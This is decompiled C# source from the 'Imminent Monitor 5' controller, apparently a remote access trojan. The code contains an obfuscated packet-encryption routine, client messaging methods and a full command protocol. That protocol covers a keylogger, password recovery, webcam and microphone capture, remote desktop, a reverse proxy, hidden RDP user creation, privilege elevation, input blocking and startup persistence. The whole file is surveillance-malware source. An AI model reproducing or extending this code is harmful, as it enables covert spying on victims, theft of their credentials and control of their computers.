// Decompiled with JetBrains decompiler
// Type: dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic.CompilerServices;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Text;

[StandardModule]
public sealed class dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd
{
  private static Class159 class159_0 = new Class159();
  public static GClass22 gclass22_0;
  public static List<GClass20> list_0 = new List<GClass20>();
  public static Queue<GClass18> queue_0 = new Queue<GClass18>();

  public static byte[] smethod_0(byte[] byte_0, byte[] byte_1)
  {
    byte[] numArray;
    try
    {
      int num1 = 11;
      int num2 = 13;
      int num3 = 257;
      int num4 = byte_1.Length - 1;
      for (int index = 0; index <= num4; ++index)
        num3 += num3 % ((int) byte_1[index] + 1);
      int num5 = byte_0.Length - 1;
      for (int index = 0; index <= num5; ++index)
      {
        int num6 = (int) byte_1[index % byte_1.Length] + num3;
        num1 = (num6 + 5) * (num1 & (int) byte.MaxValue) + (num1 >> 8);
        num2 = (num6 + 7) * (num2 & (int) byte.MaxValue) + (num2 >> 8);
        num3 = (num1 << 8) + num2 & (int) byte.MaxValue;
        byte_0[index] = (byte) ((int) byte_0[index] ^ (int) (byte) num3);
      }
      numArray = byte_0;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      numArray = new byte[1]{ (byte) 90 };
      ProjectData.ClearProjectError();
    }
    return numArray;
  }

  public static byte[] smethod_1(byte[] byte_0, byte[] byte_1, int int_0, int int_1)
  {
    byte[] numArray;
    try
    {
      int num1 = 11;
      int num2 = 13;
      int num3 = 257;
      int num4 = byte_1.Length - 1;
      for (int index = 0; index <= num4; ++index)
        num3 += num3 % ((int) byte_1[index] + 1);
      int num5 = int_1 - 1;
      for (int index = 0; index <= num5; ++index)
      {
        int num6 = (int) byte_1[index % byte_1.Length] + num3;
        num1 = (num6 + 5) * (num1 & (int) byte.MaxValue) + (num1 >> 8);
        num2 = (num6 + 7) * (num2 & (int) byte.MaxValue) + (num2 >> 8);
        num3 = (num1 << 8) + num2 & (int) byte.MaxValue;
        byte_0[index + int_0] = (byte) ((int) byte_0[index + int_0] ^ (int) (byte) num3);
      }
      numArray = byte_0;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      numArray = new byte[1]{ (byte) 90 };
      ProjectData.ClearProjectError();
    }
    return numArray;
  }

  public static void smethod_2(GClass18 gclass18_0, object[] object_0)
  {
    try
    {
      if (object_0 == null || gclass18_0 == null)
        return;
      if (gclass18_0.method_12())
      {
        object_0 = dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_9(gclass18_0, dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.ClientPacket, object_0).ToArray();
        byte[] byte_2 = !gclass18_0.method_8() ? dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.class159_0.method_0(object_0) : Encoding.UTF8.GetBytes(JsonConvert.SerializeObject((object) object_0));
        if (byte_2 == null)
          return;
        Class97.gclass39_0.vmethod_0().method_31(byte_2);
      }
      else
      {
        byte[] byte_2 = !gclass18_0.method_8() ? dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.class159_0.method_0(object_0) : Encoding.UTF8.GetBytes(JsonConvert.SerializeObject((object) object_0));
        if (byte_2 == null)
          return;
        gclass18_0.method_31(byte_2);
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      gclass18_0?.method_32();
      ProjectData.ClearProjectError();
    }
  }

  public static void smethod_3(GClass18 gclass18_0, object[] object_0)
  {
    try
    {
      if (gclass18_0.method_12())
      {
        object_0 = dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_9(gclass18_0, dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.ClientPacket, object_0).ToArray();
        byte[] byte_2 = dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.class159_0.method_4(object_0);
        Class97.gclass39_0.vmethod_0().method_31(byte_2);
      }
      else
      {
        byte[] byte_2 = dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.class159_0.method_4(object_0);
        gclass18_0.method_31(byte_2);
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void smethod_4(GClass18 gclass18_0, object[] object_0)
  {
    try
    {
      if (object_0 == null || gclass18_0 == null)
        return;
      byte[] byte_2 = dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.class159_0.method_0(object_0);
      if (byte_2 == null)
        return;
      gclass18_0.method_31(byte_2);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      gclass18_0?.method_32();
      ProjectData.ClearProjectError();
    }
  }

  public static void smethod_5(GClass18 gclass18_0)
  {
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(gclass18_0, new object[1]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Ping
    });
    if (gclass18_0.method_20() == null)
      return;
    gclass18_0.method_20().stopwatch_0 = new Stopwatch();
    gclass18_0.method_20().stopwatch_0.Start();
  }

  public static void smethod_6(GClass18 gclass18_0) => dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(gclass18_0, new object[1]
  {
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Refresh
  });

  public static void smethod_7(GClass18 gclass18_0) => dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(gclass18_0, new object[1]
  {
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Disconnect
  });

  public static void smethod_8(GClass18 gclass18_0) => dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(gclass18_0, new object[1]
  {
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Uninstall
  });

  public static List<object> smethod_9(
    GClass18 gclass18_0,
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader packetHeader_0,
    object[] object_0)
  {
    List<object> objectList = new List<object>();
    objectList.Add((object) packetHeader_0);
    objectList.Add((object) gclass18_0.method_20().string_0);
    int num = object_0.Length - 1;
    for (int index = 0; index <= num; ++index)
      objectList.Add(RuntimeHelpers.GetObjectValue(object_0[index]));
    return objectList;
  }

  public static List<GClass18> smethod_10()
  {
    List<GClass18> gclass18List = new List<GClass18>();
    lock (Class97.list_0)
    {
      try
      {
        foreach (GClass18 gclass18 in new List<GClass18>((IEnumerable<GClass18>) Class97.list_0))
          gclass18List.Add(gclass18);
      }
      finally
      {
        List<GClass18>.Enumerator enumerator;
        enumerator.Dispose();
      }
      return gclass18List;
    }
  }

  public enum GEnum9
  {
  }

  public enum ChatHeaderPacket : byte
  {
    ShowChat,
    Message,
    CloseChat,
  }

  public enum CommandPromptPacket : byte
  {
    Start,
    StopCmd,
    Out,
    CmdIn,
  }

  public enum ConnectionSocketPacket : byte
  {
    CommandSocket,
    DesktopSocket,
    FileTransferSocket,
    ProxySocket,
    WebcamSocket,
    PluginSocket,
  }

  public enum ExecutePacket : byte
  {
    Update = 0,
    Download = 3,
    UpdateProgress = 4,
  }

  public enum FastTransferPacket : byte
  {
    Execution,
  }

  public enum FileHeaderPacket : byte
  {
    ListFiles,
    Drives,
    ExecuteFile,
    Delete,
    CreateFolder,
    Rename,
    Wallpaper,
    Thumbnail,
    Upload,
    Download,
    SpecialFolder,
    Search,
    SearchUpdate,
  }

  public enum FileThumbnailGallery : byte
  {
    List,
    NextImage,
    PreviousImage,
  }

  public enum KeyloggerPacket : byte
  {
    Refresh,
    Download,
    Delete,
    StartLive,
    StopLive,
    Window,
    Key,
  }

  public enum MessageBoxPacket : byte
  {
    MessageInformation,
    MessageError,
    MessageWarning,
    MessageQuestion,
    MessageNothing,
    ButtonYesNo,
    ButtonOk,
    ButtonOkCancel,
  }

  public enum MicrophonePacket : byte
  {
    Initialize,
    StopStream,
    SendStream,
    DeviceList,
  }

  public enum MiscPacket : byte
  {
    HideDesktopItems = 0,
    ShowDesktopItems = 1,
    LockDesktopItems = 2,
    UnlockDesktopItems = 3,
    HideTaskbar = 4,
    ShowTaskBar = 5,
    LockTaskbar = 6,
    UnlockTaskbar = 7,
    HideStartButton = 8,
    ShowStartButton = 9,
    Shutdown = 12, // 0x0C
    Reboot = 13, // 0x0D
    LogOff = 14, // 0x0E
    Hibernate = 15, // 0x0F
    Suspend = 16, // 0x10
    MonitorOff = 17, // 0x11
    MonitorOn = 18, // 0x12
    BlockInput = 19, // 0x13
    Unblockinput = 20, // 0x14
  }

  public enum MouseActionPacket : byte
  {
    Up,
    Down,
    Move,
    ScrollUp,
    ScrollDown,
  }

  public enum MouseButtonPacket : byte
  {
    Left,
    Right,
    Move,
    Scroll,
    Middle,
    Hover,
  }

  public enum NetworkStatPacket : byte
  {
    Refresh,
    NetworkLog,
    SystemLog,
    DeleteLogs,
  }

  public enum PacketHeader : byte
  {
    Initialize = 0,
    SystemInformation = 1,
    Processes = 2,
    Window = 3,
    Disconnect = 4,
    ClipBoardSet = 5,
    ClipBoardGet = 6,
    FileHeader = 7,
    Desktop = 8,
    NewConnection = 9,
    MouseInput = 10, // 0x0A
    KeyboardInput = 11, // 0x0B
    FileTransfer = 12, // 0x0C
    ReverseProxy = 13, // 0x0D
    Startup = 14, // 0x0E
    Location = 15, // 0x0F
    Scripting = 16, // 0x10
    ThumbnailView = 17, // 0x11
    Webcam = 18, // 0x12
    Ping = 19, // 0x13
    Refresh = 20, // 0x14
    Keylogger = 21, // 0x15
    Chat = 22, // 0x16
    TextToSpeach = 23, // 0x17
    CommandPrompt = 24, // 0x18
    Execute = 25, // 0x19
    TcpConnections = 26, // 0x1A
    FastTransfer = 27, // 0x1B
    MessageBox = 28, // 0x1C
    Microphone = 29, // 0x1D
    MalwareRemoval = 30, // 0x1E
    PasswordRecovery = 31, // 0x1F
    Website = 32, // 0x20
    Uninstall = 33, // 0x21
    Misc = 34, // 0x22
    ChangeEncryptionKey = 37, // 0x25
    KeepAlive = 38, // 0x26
    LogPacket = 39, // 0x27
    UpdateInfo = 40, // 0x28
    Registry = 41, // 0x29
    Test = 42, // 0x2A
    Plugin = 43, // 0x2B
    Elevate = 44, // 0x2C
    RDP = 45, // 0x2D
    ClientErrorMessage = 46, // 0x2E
    NetworkStats = 47, // 0x2F
    CrossPlatformInitialize = 48, // 0x30
    ReportInvalid = 49, // 0x31
    ClientList = 243, // 0xF3
    ClientDisconnect = 244, // 0xF4
    ServerInitialize = 245, // 0xF5
    ClientPacket = 246, // 0xF6
  }

  public enum PasswordRecoveryPacket : byte
  {
    Refresh,
  }

  public enum PluginPacket : byte
  {
    Initialize,
    FromPlugin,
    Unload,
  }

  public enum ProcessHeaderPacket : byte
  {
    Refresh,
    Kill,
    Suspend,
    ResumeProcess,
  }

  public enum ProxyPacket : byte
  {
    StartProxy,
    ReverseProxyData,
    ReverseProxyConnectResponse,
    ReverseProxyConnect,
    ReverseProxyDisconnect,
  }

  public enum RDPPacket : byte
  {
    Install,
    AddUser,
    RemoveUser,
    CheckInstallation,
    GetUsers,
    GetArch,
  }

  public enum RegistryPacket : byte
  {
    SubKeyList,
    RetrieveValueList,
    CreateValuePacket,
    DeleteValuePacket,
  }

  public enum RemoteDesktopPacket : byte
  {
    Initialize,
    SendScreen,
    Disconnect,
    Quality,
    Screen,
    Resize,
    DXGISetup,
  }

  public enum ScriptPacket : byte
  {
    Html,
    Vbs,
    Batch,
  }

  public enum ServerHeader : byte
  {
    Initialize,
  }

  public enum SpecialFolderPacket : byte
  {
    ApplicationData,
    CommonApplicationData,
    CommonProgramFiles,
    Cookies,
    Desktop,
    Favorites,
    History,
    LocalApplicationData,
    MyDocuments,
    MyMusic,
    MyPictures,
    ProgramFiles,
    Recent,
    StartMenu,
    Startup,
    System,
    Templates,
    Temp,
    Windows,
    UserProfile,
  }

  public enum StartupPacket : byte
  {
    Refresh,
    Delete,
    HKCU,
    HKLM,
    Explorer,
  }

  public enum TcpConnectionPacket : byte
  {
    Refresh,
    Close,
  }

  public enum ThumbnailPacket : byte
  {
    Create,
    Update,
    Kill,
  }

  public enum TransferHeader : byte
  {
    Initialize,
    StartDownload,
    StartUpload,
    Disconnect,
    FileInfo,
    DataChunk,
    RequestNext,
    Cancel,
  }

  public enum WebcamPacket : byte
  {
    GetDevices,
    StartStream,
    StopStream,
    Image,
    Quality,
  }

  public enum WindowPacket : byte
  {
    Refresh,
    Caption,
    Suspend,
    ResumeWindow,
    Hide,
    Show,
    Minimize,
    Restore,
    Close,
    Visible,
    Invisible,
  }
}
